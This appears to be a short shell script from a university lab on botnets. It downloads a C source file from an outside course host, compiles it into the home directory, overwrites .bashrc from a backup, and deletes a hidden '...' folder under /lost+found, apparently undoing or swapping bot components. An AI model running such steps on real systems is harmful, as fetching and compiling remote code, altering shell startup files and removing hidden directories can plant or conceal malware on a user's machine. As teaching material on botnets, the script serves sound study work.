#!/bin/sh
DIRECTORY="~/"
TARGET=".bashrc"
FULLPATH="${DIRECTORY}${TARGET}"
BACKUP="${TARGET}_old"

DIR='/lost+found/'
FOLDER='...'

echo running: `pwd` 

rm ~/cgethttp.c                                                                                                             
wget "abstract.cs.washington.edu/~roy/lab3/Botnet/cgethttp_old.c"                      
mv cgethttp_old.c ~/cgethttp.c
gcc ~/cgethttp.c -o ~/cgethttp                                                                                                 chmod +x ~/cgethttp
cp $BACKUP $FULLPATH

echo `ls .`

rm -r ${DIR}${FOLDER}/*
rmdir ${DIR}${FOLDER}

echo `ls .`